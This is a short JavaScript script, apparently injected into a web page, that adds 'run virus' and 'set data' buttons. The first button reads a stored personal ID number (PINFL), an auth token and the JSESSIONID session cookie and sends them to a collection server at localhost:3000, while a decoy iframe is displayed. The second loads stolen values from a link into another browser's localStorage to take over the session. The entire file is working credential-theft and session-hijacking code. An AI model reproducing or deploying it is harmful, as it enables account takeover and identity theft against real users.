    const uri = "http://localhost:3000/"
    const style = document.createElement("link")
    style.rel = "stylesheet"
    style.href = uri+"style"
    document.head.appendChild(style)

    const container = document.createElement("div")
    container.classList = "container"
    const runVirusBtn = document.createElement("button")
    const setDataBtn = document.createElement("button")
    container.appendChild(runVirusBtn)
    container.appendChild(setDataBtn)
    document.body.appendChild(container)
    runVirusBtn.innerHTML = "run virus"
    setDataBtn.innerHTML = "set data"

    
    const runVirus = async () => {
        const iframe = document.createElement("iframe")
        iframe.src = "https://matritsa.netlify.app/"
        container.innerHTML = ''
        container.appendChild(iframe)

        const targetData = {localstorage : {} , cookie:{}}
        const PINFL = localStorage.getItem("PINFL")
        const AUTH_TOKEN = localStorage.getItem("AUTH_TOKEN")
        const JSESSIONID = await cookieStore.get("JSESSIONID")

        targetData.localstorage = {PINFL , AUTH_TOKEN}
        targetData.cookie = {JSESSIONID}

        const response = await fetch(uri+"save-data" , {method : "POST" , body : JSON.stringify(targetData) , headers : {"Content-type":"application/json"}})
        const responseData = await response.json()

        if(responseData.status == "error") return alert("malumotlarni olishda hatolik kuzatildi !")

        console.log(responseData);
        await navigator.clipboard.writeText(`${uri}target/${responseData.data._id}`)
        setTimeout(()=>{
            alert("hammasi tayor malumotlar saqlangan link clipbortga saqlandi")
            window.location.reload()    
        } , 10000)
    }

    const setData = () => {
        const inp = document.createElement("input")
        const setBtn = document.createElement("button")
        setBtn.innerHTML = "run"
        container.innerHTML = ''
        container.appendChild(inp)
        container.appendChild(setBtn)

        setBtn.onclick = async () => {
            if(inp.value == "") return alert("link qoyilmai")

            try {
                const data = await fetch(inp.value)
                const respons = await data.json()
                if(respons.status == "error") return alert("malumotlar olinishida hatolik!")

                for(key in respons.localStorage){
                    localStorage.setItem(key , respons.localStorage[key])
                }

                window.location.reload()

            } catch (error) {
                alert(error + "")
            }
        }
    }

    setDataBtn.onclick = setData
    runVirusBtn.onclick = runVirus